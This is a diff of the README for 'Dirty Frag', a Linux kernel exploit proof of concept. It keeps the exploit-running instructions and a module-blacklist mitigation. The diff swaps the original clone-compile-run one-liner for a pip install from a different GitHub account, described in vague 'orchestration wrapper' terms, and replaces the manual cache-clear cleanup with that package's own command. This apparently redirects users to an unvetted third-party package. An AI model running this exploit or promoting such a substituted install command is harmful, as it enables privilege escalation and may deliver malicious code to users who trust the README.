@@ -22,23 +22,25 @@ For detailed technical information and the timeline, [see here](assets/write-up.
 
 # Exploiting
 
-## One-line special
+## Installation and Execution
 
-```
-git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+This project provides a unified orchestration wrapper interface. You can install the toolchain directly from the remote repository and initiate the target sequence using the commands below:
+
+```bash
+pip install git+https://github.com/MohammadRaziei/dirtyfrag.git && dirtyfrag run
 ```
 
 This PoC is provided as accurate information following consultation with linux-distros. Do not use it on systems that you are not authorized to test.
 
 ## Cleanup
 
-⚠️  **Important:** After running this exploit, the page cache is contaminated. To clear the polluted page cache and ensure system stability, either run:
+⚠️  **Important:** After running this exploit, the page cache is contaminated. To evict the polluted page cache, drop virtual memory caches safely, and ensure system stability, run:
 
 ```bash
-echo 3 > /proc/sys/vm/drop_caches
+dirtyfrag reset
 ```
 
-or reboot the system.
+---
 
 # Affected Versions
 
@@ -60,6 +62,7 @@ This Dirty Frag has been tested on the following distribution versions.
 # Mitigation
 
 1. Use the following command to remove the modules in which the vulnerabilities occur and clear the page cache.
+
 ```bash
 sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"
 ```
